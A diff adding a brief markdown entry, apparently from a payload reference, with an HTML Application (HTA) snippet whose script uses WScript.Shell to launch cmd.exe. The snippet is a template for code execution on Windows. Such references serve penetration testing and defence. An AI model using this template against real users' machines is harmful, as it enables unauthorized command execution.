@@ -1,0 +1,11 @@
+# HTA
+```text-html
+<html>
+<body>
+<script>
+	var c= 'cmd.exe'
+	new ActiveXObject('WScript.Shell').Run(c);
+</script>
+</body>
+</html>
+```
